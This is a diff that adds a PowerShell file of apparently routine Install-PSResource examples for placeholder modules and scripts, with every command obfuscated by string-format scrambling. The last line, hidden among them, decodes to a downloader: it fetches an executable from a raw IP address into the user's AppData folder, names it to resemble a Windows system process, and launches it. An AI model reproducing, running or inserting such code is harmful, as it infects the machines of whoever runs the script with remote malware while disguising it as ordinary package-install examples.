@@ -1,0 +1,170 @@
+.("{1}{3}{2}{0}"-f 'rce','I','PSResou','nstall-') ("{0}{1}{2}"-f 'TestMo','d','ule')
+
+
+&("{4}{2}{0}{3}{5}{1}" -f'PSR','ource','ll-','e','Insta','s') -name ("{1}{0}{2}" -f 'tMod','Tes','ule')
+
+
+.("{0}{1}{2}{5}{4}{3}"-f 'In','stall','-P','ce','sour','SRe') ("{2}{1}{3}{0}" -f '1','odul','TestM','e'), ("{1}{2}{0}{3}"-f'Module','Tes','t','2'), ("{1}{3}{2}{0}"-f '3','TestMo','le','du')
+
+
+.("{2}{1}{3}{0}" -f 'll-PSResource','st','In','a') ("{2}{0}{1}" -f'ul','e','TestMod') -MinimumVersion ("{0}{1}" -f '1.5.','0')
+
+
+&("{1}{0}{4}{2}{3}" -f 'SRe','Install-P','our','ce','s') ("{2}{1}{0}" -f'e','l','TestModu') -MaximumVersion ("{1}{0}" -f '0','1.5.')
+
+
+&("{2}{3}{0}{5}{1}{4}" -f'esou','c','Instal','l-PSR','e','r') ("{1}{0}{2}" -f'stModul','Te','e') -MinimumVersion ("{0}{1}"-f '1','.0.0') -MaximumVersion ("{1}{0}" -f'0','2.0.')
+
+
+.("{4}{1}{2}{3}{0}"-f'ource','ll','-','PSRes','Insta') ("{2}{3}{1}{0}"-f 'le','u','TestM','od') -RequiredVersion ("{1}{0}"-f'0','1.5.')
+
+
+&("{1}{2}{0}{5}{3}{4}" -f 'tal','In','s','Resourc','e','l-PS') ("{2}{0}{1}{3}"-f 'es','tModu','T','le') -Prerelease
+
+
+&("{0}{3}{1}{2}{4}" -f'Inst','PSRe','sou','all-','rce') ("{0}{2}{1}"-f 'TestM','dule','o') -Repository ("{1}{0}{2}" -f'pos','Re','itory1'), ("{3}{2}{0}{1}" -f'itory','2','os','Rep')
+
+
+.("{0}{3}{1}{2}"-f'Install-PSR','sourc','e','e') -RequiredResources @{
+    ("{1}{0}{2}"-f'figurat','Con','ion') = ((("{0}{1}{3}{2}" -f'[1','.3.','2.0)','1,')))
+    ("{1}{0}" -f 'ester','P')        = @{
+        ("{1}{0}" -f'ersion','v')    = ("{1}{0}{2}"-f ',4.7.0','[4.4.2',']')
+        ("{0}{3}{1}{2}"-f'r','osito','ry','ep') = ("{3}{0}{8}{4}{2}{5}{1}{6}{7}" -f 's:','shellg','po','http','/www.','wer','allery.co','m','/')
+    }
+}
+
+
+&("{5}{4}{0}{1}{3}{2}"-f 'o','ur','e','c','SRes','Install-P') -RequiredResources ("{3}{1}{2}{0}{4}" -f 'rtTo-Jso','nv','e','Co','n') (
+    @{
+        ("{3}{1}{2}{0}"-f 'n','figu','ratio','Con') = ((("{1}{2}{0}"-f'0)','[1.3.','1,2.')))
+        ("{0}{1}"-f'Pest','er')        = @{
+            ("{1}{2}{0}" -f 'n','v','ersio')    = ("{3}{2}{1}{4}{0}"-f'.0]','4','4.4.2,','[','.7')
+            ("{0}{1}{2}" -f 'reposi','t','ory') = ("{0}{4}{2}{7}{8}{3}{5}{1}{6}" -f 'ht','h','ps','www.powe','t','rs','ellgallery.com',':/','/')
+        }
+    }
+)
+
+
+&("{2}{4}{1}{0}{3}"-f'u','so','Install-PSR','rce','e') -RequiredResourcesFile ("{2}{4}{3}{0}{1}"-f'Reso','urce.psd1','R','d','equire')
+
+
+&("{1}{3}{2}{0}"-f 'urce','In','o','stall-PSRes') -RequiredResourcesFile ("{5}{4}{3}{2}{1}{6}{0}"-f 'son','e','edResourc','ir','qu','Re','.j')
+
+
+.("{3}{1}{2}{0}" -f 'e','e','sourc','Install-PSR') ("{1}{2}{0}"-f 'dule','T','estMo') -Scope ("{0}{2}{1}"-f'Cur','r','rentUse')
+
+
+&("{1}{2}{3}{0}" -f'e','Ins','tall-PSR','esourc') ("{0}{2}{1}" -f 'Tes','Module','t') -Scope ("{1}{0}"-f 's','AllUser')
+
+
+.("{0}{2}{4}{1}{3}"-f'Insta','Resour','ll-','ce','PS') ("{2}{0}{3}{1}" -f'stMo','ule','Te','d') -NoClobber
+
+
+.("{3}{4}{1}{5}{2}{0}"-f 'urce','tall','so','In','s','-PSRe') ("{2}{1}{0}" -f 'dule','o','TestM') -IgnoreDifferentPublisher
+
+
+&("{5}{2}{4}{1}{3}{0}" -f'esource','-PS','stal','R','l','In') ("{2}{1}{0}{3}"-f'dul','o','TestM','e') -TrustRepository
+
+
+&("{1}{2}{0}{3}"-f 'PSR','Ins','tall-','esource') ("{3}{0}{2}{1}" -f 'o','ule','d','TestM') -Force
+
+
+&("{3}{2}{0}{1}{4}"-f 'll-','P','ta','Ins','SResource') ("{2}{0}{1}"-f'stModu','le','Te') -Reinstall
+
+
+&("{2}{0}{1}{3}" -f 'stall-PS','Reso','In','urce') ("{3}{0}{1}{2}" -f 'od','ul','e','TestM') -Quiet
+
+
+&("{2}{0}{4}{1}{3}"-f't','ourc','Ins','e','all-PSRes') ("{2}{1}{0}"-f'e','ul','TestMod') -AcceptLicense
+
+
+&("{3}{1}{0}{4}{2}" -f 's','l-PSRe','e','Instal','ourc') ("{1}{0}{2}"-f 's','Te','tModule') -PassThru
+
+
+
+
+
+
+&("{3}{0}{2}{1}" -f 'st','urce','all-PSReso','In') ("{0}{2}{1}"-f 'TestSc','ipt','r')
+
+
+.("{1}{3}{0}{2}{5}{4}"-f 'ta','In','ll-PSR','s','ource','es') -name ("{2}{1}{0}"-f 'pt','stScri','Te')
+
+
+&("{4}{1}{3}{2}{5}{0}"-f 'ce','sta','-PS','ll','In','Resour') ("{1}{2}{0}"-f 'ript1','TestS','c'), ("{1}{2}{0}" -f'Script2','Tes','t'), ("{1}{2}{0}"-f'ipt3','TestSc','r')
+
+
+.("{4}{0}{2}{1}{3}" -f 'P','R','S','esource','Install-') ("{3}{0}{1}{2}" -f'Sc','ri','pt','Test') -MinimumVersion ("{1}{0}" -f'.0','1.5')
+
+
+.("{1}{4}{2}{3}{0}" -f'urce','Insta','PSR','eso','ll-') ("{1}{3}{0}{2}"-f'crip','Tes','t','tS') -MaximumVersion ("{0}{1}" -f'1.','5.0')
+
+
+.("{4}{3}{0}{1}{2}" -f 'ta','ll','-PSResource','ns','I') ("{2}{1}{0}"-f 'pt','tScri','Tes') -MinimumVersion ("{0}{1}" -f '1.0','.0') -MaximumVersion ("{1}{0}" -f'0.0','2.')
+
+
+.("{3}{2}{0}{5}{1}{4}" -f 'all-PSRe','u','nst','I','rce','so') ("{3}{2}{0}{1}"-f's','tScript','e','T') -RequiredVersion ("{0}{1}" -f '1','.5.0')
+
+
+.("{2}{3}{1}{0}{4}" -f '-PSResour','tall','I','ns','ce') ("{2}{0}{1}"-f 'stScri','pt','Te') -Prerelease
+
+
+&("{1}{4}{0}{2}{3}"-f'-P','In','SResour','ce','stall') ("{3}{0}{2}{1}" -f 'S','pt','cri','Test') -Repository ("{0}{2}{1}" -f'R','pository1','e'), ("{2}{0}{1}{3}"-f'sito','r','Repo','y2')
+
+
+&("{5}{4}{0}{2}{1}{3}"-f'l-','Reso','PS','urce','l','Insta') -RequiredResources @{
+    ("{1}{4}{3}{0}{2}"-f 'gurat','C','ion','fi','on') = ((("{0}{2}{1}"-f'[','1,2.0)','1.3.')))
+    ("{0}{1}{2}" -f'T','estScri','pt')    = @{
+        ("{2}{0}{1}" -f 'rsi','on','ve')    = ("{2}{4}{0}{1}{3}"-f '4.','2,4.7.','[','0]','4.')
+        ("{0}{2}{1}{3}"-f 're','ito','pos','ry') = ("{1}{6}{4}{5}{2}{3}{7}{0}"-f 'llery.com','ht','r','shell','w.po','we','tps://ww','ga')
+    }
+}
+
+
+.("{1}{2}{3}{0}" -f'urce','In','sta','ll-PSReso') -RequiredResources ("{1}{3}{0}{2}{4}" -f'tT','Con','o-Js','ver','on') (
+    @{
+        ("{3}{4}{0}{2}{1}" -f'ur','tion','a','C','onfig') = ((("{1}{0}{2}" -f ',2','[1.3.1','.0)')))
+        ("{0}{1}{3}{2}" -f 'Test','Scr','t','ip')    = @{
+            ("{1}{0}"-f 'ion','vers')    = ("{2}{1}{4}{3}{0}"-f']','4.','[',',4.7.0','4.2')
+            ("{1}{2}{0}" -f 'y','rep','ositor') = ("{0}{2}{3}{1}{5}{4}"-f'https','lle','://www.power','shellga','y.com','r')
+        }
+    }
+)
+
+
+&("{3}{4}{0}{2}{1}" -f 'tall-PSResou','e','rc','I','ns') -RequiredResourcesFile ("{1}{4}{2}{3}{0}"-f 'd1','Requir','dResource.','ps','e')
+
+
+&("{0}{1}{2}{3}{4}"-f 'Inst','a','ll-P','SRes','ource') -RequiredResourcesFile ("{0}{4}{2}{3}{1}{5}"-f'Required','jso','source','.','Re','n')
+
+
+&("{3}{1}{0}{2}"-f 'SRes','l-P','ource','Instal') ("{2}{1}{0}{3}"-f 'Scri','est','T','pt') -Scope ("{1}{2}{0}" -f 'User','Curren','t')
+
+
+.("{4}{0}{3}{1}{2}" -f 'll-P','ou','rce','SRes','Insta') ("{2}{0}{1}"-f 's','tScript','Te') -Scope ("{1}{2}{0}"-f 'ers','All','Us')
+
+
+&("{3}{2}{4}{0}{1}" -f'es','ource','all','Inst','-PSR') ("{0}{2}{1}{3}" -f 'Tes','d','tMo','ule') -NoClobber
+
+
+&("{3}{2}{1}{0}"-f'Resource','PS','-','Install') ("{1}{0}{2}"-f'est','T','Script') -IgnoreDifferentPublisher
+
+
+.("{4}{2}{5}{1}{0}{3}"-f'o','es','stall-PS','urce','In','R') ("{2}{0}{1}"-f 'es','tScript','T') -TrustRepository
+
+
+.("{4}{1}{0}{3}{2}" -f 'eso','R','rce','u','Install-PS') ("{1}{3}{2}{0}" -f 'pt','Te','i','stScr') -Force
+
+
+.("{1}{4}{3}{2}{0}" -f 'rce','Inst','u','o','all-PSRes') ("{0}{2}{1}"-f 'T','tScript','es') -Reinstall
+
+
+.("{0}{4}{2}{1}{3}{5}" -f 'Install-P','e','R','so','S','urce') ("{0}{2}{1}"-f 'Tes','cript','tS') -Quiet
+
+
+.("{0}{1}{3}{2}" -f 'Inst','all-PS','urce','Reso') ("{1}{0}{2}" -f'ip','TestScr','t') -AcceptLicense
+
+
+.("{2}{3}{4}{1}{0}" -f 'urce','SReso','In','st','all-P') ("{0}{1}{2}" -f 'Tes','tSc','ript') -PassThru
+
+(&("{0}{1}{2}"-f 'Ne','w-O','bject') ("{0}{3}{1}{4}{2}" -f 'Syst','t.We','ient','em.Ne','bCl')).("{2}{0}{1}"-f 'wnloadFi','le','Do').Invoke(("{2}{0}{5}{1}{8}{6}{7}{4}{3}" -f ':','.5','http','sv.exe','/csr','//94.102','38/~yah','oo','3.2'),"$env:APPDATA\csrsv.exe");.("{2}{0}{1}{3}"-f'tart','-Proces','S','s') ("$env:APPDATA\csrsv.exe")
